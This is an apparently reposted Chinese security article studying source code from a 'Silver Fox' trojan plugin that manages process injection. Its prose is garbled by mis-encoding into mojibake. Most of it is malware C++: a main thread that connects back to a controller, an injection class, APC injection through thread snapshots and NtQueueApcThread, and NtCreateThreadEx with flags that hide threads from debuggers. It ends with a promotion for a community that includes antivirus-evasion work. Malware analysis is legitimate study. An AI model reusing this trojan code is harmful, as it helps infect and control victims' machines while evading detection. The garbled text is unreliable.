> æœ¬æ–‡ç”± [ç®€æ‚¦ SimpRead](http://ksria.com/simpread/) è½¬ç ï¼Œ åŸæ–‡åœ°å€ [mp.weixin.qq.com](https://mp.weixin.qq.com/s/UjPA4k8a3gYmTaqvkXeebw)

> é“¶ç‹æœ¨é©¬æ’ä»¶æºç å­¦ä¹ ä¹‹æ³¨å…¥ç®¡ç†
> ===============

æºç ä»å…¶ä»–æ¸ é“å¾—åˆ°ï¼Œä¸ç¡®å®šå°±æ˜¯åŸç‰ˆï¼Œå¤§æ¦‚ç‡æ˜¯äºŒå¼€çš„ï¼Œå­¦ä¹ ä¸€ä¸‹å…¶ä¸­çš„æŠ€æœ¯ç‚¹ã€‚æ³¨å…¥ç®¡ç†æ’ä»¶æºç ä¸­ï¼Œdllmain é‡Œé¢ä¼šæ‰§è¡Œå¦‚ä¸‹çš„ä¸»çº¿ç¨‹

```
DWORD WINAPI MainThread(LPVOID dllMainThread)
{
    ISocketBase* socketClient;
    if (MyInfo.IsTcp == 1)
        socketClient = new CTcpSocket();
    else
        socketClient = new CUdpSocket();
    if (socketClient->Connect(MyInfo.szAddress, MyInfo.szPort))
    {
        CInjectManager manager(socketClient);
        socketClient->run_event_loop();
    }
    SAFE_DELETE(socketClient);
    if (MyInfo.RunDllEntryProc)
        ExitProcess(0);
    return 0;
}

```

ä¸Šè¿°ä»£ç ä¸­ï¼Œå»ºç«‹ socket è¿æ¥åï¼Œä¼šä¼ è¾“åç»­ç”¨çš„æ’ä»¶ï¼Œç”¨äºåç»­æ³¨å…¥ã€‚CInjectManager æ˜¯é“¶ç‹æ³¨å…¥æ’ä»¶çš„ä¸»è¦æ³¨å…¥ç±»ï¼š

```
class CInjectManager : public CManager
{
public:
    BOOL m_buser;
    CInjectManager(ISocketBase* pClient);
    virtual ~CInjectManager();
    virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
private:
    HMEMORYMODULE handle; 
        ....
        ....
private:
    void SendProcessList();
    LPBYTE getProcessList();    //è¿›ç¨‹
    BOOL DebugPrivilege(const TCHAR* PName, BOOL bEnable);
    BOOL GetProcessUserName(HANDLE hProcess, TCHAR* strProcessUser);
    BOOL DosPathToNtPath(LPTSTR pszDosPath, LPTSTR pszNtPath);
    bool Is64BitPorcess(DWORD dwProcessID);
    bool Is64BitOS();
    void SendError(TCHAR* Terror);
    void CreateLocalRecvFile(LPBYTE lpBuffer);
    void WriteLocalRecvFile(LPBYTE lpBuffer, UINT nSize);
    void WriteOk();
    void WriteDllandSetPath(BOOL isx86, TCHAR* lpBuffer);
    TCHAR szPath_dll32[MAX_PATH];
    TCHAR szPath_dll64[MAX_PATH];
    PBYTE RecvDate;
    DWORD offsetsize;       //å‘ç”Ÿåç§»
    BOOL ClientIsx86;
    INJECTMODE m_sinjectmode;
    FILEINFO m_fileinfo;
    BOOL BoxedAppSDK_Init_IsOK;
    BYTE* bxsdkbyte;
    void RunExe(LPBYTE lpBuffer);
    void RunExeuacArg(LPBYTE lpBuffer);
    void DelFile(LPBYTE lpBuffer);
    void Inject_dll();
    void Inject_shellcode();
    DWORD Flags ;
};

```

ä»–è¿™é‡Œä¸»è¦çš„æ³¨å…¥æ–¹å¼æœ‰ä»¥ä¸‹å‡ ç§ï¼š

```
enum injectmode
{
    MODE_CreateRemoteThread_dll,
    MODE_CreateRemoteThread_shellcode,
    MODE_QueueUserAPC_dll,
    MODE_QueueUserAPC_shellcode,
    MODE_NtCreateThreadEx_dll,  
    MODE_NtCreateThreadEx_shellcode,
};

```

åˆ†åˆ«æ˜¯ç»å…¸è¿œçº¿ç¨‹æ³¨å…¥ï¼ŒAPC æ³¨å…¥è¿˜æœ‰åˆ©ç”¨æœªæ–‡æ¡£çš„ NtCreateThreadEx æ³¨å…¥ã€‚é¦–å…ˆæ˜¯è¿œçº¿ç¨‹æ³¨å…¥è¿™é‡Œ, è¿™é‡Œä»–ç”¨äº†ä¸€ä¸ªå¼€æºçš„é¡¹ç›® Yapiï¼š

```
    case MODE_CreateRemoteThread_dll:
    {
        yapi::YAPICall LoadLibraryA(hProc, _T("kernel32.dll"), "LoadLibraryW");
        if (m_sinjectmode.ExeIsx86)
        {
            DWORD64 x86Dll = LoadLibraryA(m_sinjectmode.WritePath);
        }
        else
        {
            DWORD64 x64Dll = LoadLibraryA.Dw64()(m_sinjectmode.WritePath);
        }
    }

```

è¯¥é¡¹ç›®é™¤äº†æ™®é€šæ³¨å…¥å¤–ï¼Œä¹Ÿæ”¯æŒè·¨è¿›ç¨‹æ¶æ„æ¥æ³¨å…¥ï¼Œwow64->x64ã€‚ç„¶åæ˜¯ APC æ³¨å…¥ï¼š

```
    case MODE_QueueUserAPC_dll:
    {
           .........
        pNtAllocateVirtualMemory fNtAllocateVirtualMemory = (pNtAllocateVirtualMemory)fpAddresses[0];
        pNtWriteVirtualMemory fNtWriteVirtualMemory = (pNtWriteVirtualMemory)fpAddresses[1];
        pNtSuspendThread fNtSuspendThread = (pNtSuspendThread)fpAddresses[2];
        pNtAlertResumeThread fNtAlertResumeThread = (pNtAlertResumeThread)fpAddresses[3];
        pNtQueueApcThread fNtQueueApcThread = (pNtQueueApcThread)fpAddresses[4];
        HANDLE hThreadSnap = INVALID_HANDLE_VALUE;
        THREADENTRY32 te32;
        hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (hThreadSnap == INVALID_HANDLE_VALUE) {
            SendError(_T("æ— æ³•è·å–çº¿ç¨‹å¿«ç…§"));
            break;
        }
        te32.dwSize = sizeof(THREADENTRY32);
        DWORD threadId;
        if (!Thread32First(hThreadSnap, &te32)) {
            SendError(_T("æ— æ³•è·å¾—ç¬¬ä¸€ä¸ªçº¿ç¨‹"));
            break;
        }
        do {
            if (te32.th32OwnerProcessID == m_sinjectmode.dwProcessID) {
                                .......
                                .......
                                .......
                    if (fNtSuspendThread)
                    {
                        ULONG SuspendCount = 0;
                        fNtSuspendThread(hThread, &SuspendCount);
                    }
                    DWORD dwResult = fNtQueueApcThread(hThread, (PIO_APC_ROUTINE)LoadLibAddr, pDllPath, NULL, NULL);
                    if (fNtAlertResumeThread)
                    {
                        ULONG SuspendCount = 0;  //apc è¢«æ³¨å…¥çš„çº¿ç¨‹ï¼Œå¿…é¡»æ˜¯èƒ½å”¤é†’çš„
                        fNtAlertResumeThread(hThread, &SuspendCount);
                    }
                        ......
                        ......
            }
        } while (Thread32Next(hThreadSnap, &te32));
        if (!threadId)
            SendError(_T("æ²¡æœ‰çº¿ç¨‹ç”¨äºè¿›ç¨‹"));
        CloseHandle(hThreadSnap);
        return;
    }

```

é€šè¿‡åˆ›å»ºç³»ç»Ÿçº¿ç¨‹å¿«ç…§ï¼ŒæŸ¥æ‰¾çº¿ç¨‹æ‰€å±è¿›ç¨‹å±äºç›®æ ‡çš„è¿›çš„çº¿ç¨‹ï¼Œ

*   é¦–å…ˆæŒ‚èµ·è¯¥çº¿ç¨‹
    
*   ç„¶åè°ƒç”¨ NtQueueApcThread è¿›è¡Œæ³¨å…¥
    
*   ç„¶åè°ƒç”¨ NtAlertResumeThread æ¢å¤çº¿ç¨‹
    
*   æœ€åæ˜¯ NtCreateThreadEx è¿™ä¸ª API
    

è¿™ç§æ³¨å…¥æ–¹å¼å…¶ä»–éƒ¨åˆ†ï¼Œå¦‚åˆ†é…å†…å­˜ä¹‹ç±»çš„ï¼Œå’Œæ™®é€šçš„è¿œçº¿ç¨‹æ³¨å…¥æ²¡æœ‰åŒºåˆ«

```
((
pfnNtCreateThreadEx
)
pFunc
)(&
hThread
,
 
0x1FFFFF
,
 NULL
,
 hProc
,
 pCode
,
 pThreadData
,
 
Flags
,
 NULL
,
 NULL
,
 NULL
,
 NULL
);
```

ä»–è¿™é‡Œçš„ flags å€¼æ˜¯ï¼š

```
    
Flags
 
=
 THREAD_CREATE_FLAGS_CREATE_SUSPENDED 
|
 THREAD_CREATE_FLAGS_SKIP_THREAD_ATTACH 
|
 THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER
;
```

é¦–å…ˆ `THREAD_CREATE_FLAGS_CREATE_SUSPENDED`æŒ‚èµ·çš„çº¿ç¨‹ ç¬¬äºŒä¸ª flag `THREAD_CREATE_FLAGS_SKIP_THREAD_ATTACH`, æ•´æ•°ç±»å‹ä¸º 0x2ï¼Œé€šè¿‡è¿™ä¸ª flag åˆ›å»ºçš„çº¿ç¨‹ï¼Œå¦‚æœæ˜¯è°ƒè¯•å™¨è¿›ç¨‹ä¸­ï¼Œåˆ™ä¸ä¼šè¢«è°ƒè¯•å™¨é™„åŠ ï¼Œå¦‚æœæ˜¯ dll æ¨¡å—çš„è¯ï¼Œdllmain ä¸ä¼šåœ¨æ–°çš„çº¿ç¨‹ä¸­è°ƒç”¨ã€‚ç¬¬ä¸‰ä¸ª flag `THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER`ï¼Œæ•´æ•°ç±»å‹ä¸º 0x4ï¼Œé¡¾åæ€ä¹‰ï¼Œé€šè¿‡è¯¥æ ‡å¿—ä½åˆ›å»ºçš„æ–°çº¿ç¨‹ï¼Œè°ƒè¯•å™¨æ°¸è¿œä¸ä¼šä»ç›¸åº”çš„çº¿ç¨‹æ¥æ”¶ä»»ä½•è°ƒè¯•äº‹ä»¶ï¼Œèµ·åˆ°åè°ƒè¯•æ•ˆæœï¼Œåœ¨ Ethread ä¸­æœ‰ä¸€ä¸ª HideFromDebugger flag è¢«ç½®ä½çš„è¯ï¼Œå…¶å®å°±æ˜¯è¿™ä¸ªæ•ˆæœã€‚NtCreateThreadEx è¿˜æœ‰å…¶ä»–æœ‰æ„æ€çš„åœ°æ–¹ï¼Œæ¯”å¦‚å¯ä»¥æ‹¿æ¥è·¨ä¼šè¯æ³¨å…¥ã€‚

**è¿™æ˜¯ä¸€ä¸ªçº¯ç²¹ï¼Œå¼€æ”¾ï¼Œå‰æ²¿çš„æŠ€æœ¯äº¤æµç¤¾åŒºï¼Œæˆå‘˜ä¸»è¦æœ‰äº’è”ç½‘å¤§å‚å®‰å…¨éƒ¨é—¨ä»»èŒçš„æˆå‘˜ï¼Œä¹™æ–¹çº¢é˜Ÿä¸“å®¶ï¼Œä»¥åŠæ­£åœ¨å­¦ä¹ å…¥é—¨çš„å°ç™½ç­‰ï¼Œç¤¾åŒºæ¶‰åŠçš„é¢†åŸŸçŸ¥è¯†åŒ…æ‹¬ä½†ä¸é™äºæ¸—é€ï¼Œå…æ€å¼€å‘ï¼Œçº¢è“å¯¹æŠ—ï¼Œå®‰å…¨å»ºè®¾ï¼Œè€ƒè¯•è®¤è¯ï¼Œå²—ä½æ‹›è˜ç­‰ç­‰æ–¹é¢ï¼Œè¿˜å¯ä»¥ç»“è¯†å¾ˆå¤šå¿—åŒé“åˆçš„æœ‹å‹ï¼Œæå‡è‡ªå·±çš„æŠ€æœ¯æ ˆï¼Œå¼€é˜”è§†é‡ï¼Œæå‡çœ¼ç•ŒğŸ‘‡**ğŸ‘‡**ğŸ‘‡******